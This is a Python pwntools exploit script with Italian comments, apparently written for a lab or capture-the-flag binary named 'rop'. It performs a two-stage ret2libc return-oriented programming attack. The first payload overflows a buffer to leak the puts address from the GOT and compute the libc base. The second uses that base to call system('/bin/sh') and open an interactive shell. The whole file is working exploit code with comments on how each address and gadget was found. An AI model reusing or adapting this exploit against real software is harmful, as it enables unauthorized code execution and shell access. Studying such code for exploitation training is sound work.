from pwn import *
from pwn import p64, u64

#Questo exploit si basa sul Return-Oriented Programming (ROP). Per ricavare gli indirizzi sono stati
# utilizzati: strings, objdump, ropper, readelf, gef (gdb).

def main():
    e = ELF('../Machines/rop') #path del file vulnerabile
    p = process(e.path) 


    #I seguenti indirizzi sono stati ottenuti tramite objdump -D <nome_file> | grep <func>
    puts_plt_addr = p64(0x401050) #indirizzo puts nella sezione di PLT dell'eseguibile
    puts_got_addr = p64(0x404018) #indirizzo puts nella sezione di GOT dell'eseguibile
    main_plt_addr = p64(0x401156) #indirizzo della funzione main di PLT

    #I seguenti indirizzi sono stati ottenuti tramite ropper sull'eseguibile
    pop_rdi_gadget = p64(0x401203)
    ret_gadget = p64(0x40101a)

    #I seguenti indirizzi sono stati ottenuti tramite ropper sul libc (in questo caso libc-2.31.so)
    puts_libc_addr = 0x84420 #offset dell'indirizzo della funzione puts() in libc
    system_libc_addr = 0x52290 #offset dell'indirizzo della funzione system() in libc

    #Infine, "/bin/sh" è stata ottenuta tramite strings -a -t x <file_libc> | grep '/bin/sh'
    bin_sh_libc_addr = 0x1b45bd #offset dell'indirizzo della stringa '/bin/sh' in libc

    #Junk iniziale per riempire il buffer (registri $rbp e $rsp)
    junk = b'A'*264

    #Creazione del primo payload: junk + indirizzo del gadget pop_rdi_ret + inidirizzo puts (GOT), argomento della puts
    # + indirizzo puts (PLT) + indirizzo main, per ri-eseguire il main
    payload = junk
    payload += pop_rdi_gadget
    payload += puts_got_addr
    payload += puts_plt_addr
    payload += main_plt_addr
    print(p.recvline())
    print(payload)
    p.sendline(payload)
    print(p.recvline())

    leaked = p.recvline()[:8].replace(b'\n', b'').ljust(8, b"\x00")

    #Il programma, come voluto, stampa tramite puts(), l'indirizzo della puts nel GOT,
    # tramite cui è possibile ricavare l'indirizzo base di libc
    log.success("Leaked address: " + str(leaked))
    leaked = u64(leaked)
    offset = leaked - puts_libc_addr
    sys = p64(system_libc_addr+offset)
    sh = p64(bin_sh_libc_addr+offset)

    #Ri-esecuzione del main -> Creazione del secondo payload: junk + indirizzo di un ret_gadget,
    # per aggirare il "16-byte alignment requirement" su 64bit + indirizzo del gadget pop_rdi_ret
    # + indirizzo di "/bin/sh" + indirizzo della funzione system()
    payload2 = junk
    payload2 += ret_gadget
    payload2 += pop_rdi_gadget
    payload2 += sh
    payload2 += sys
    print(p.recvline())
    print(payload2)
    p.sendline(payload2)
    print(p.recvline())

    #Passaggio a modalità interattiva -> Shell spawn
    p.interactive()
    


if __name__ == '__main__':
    main()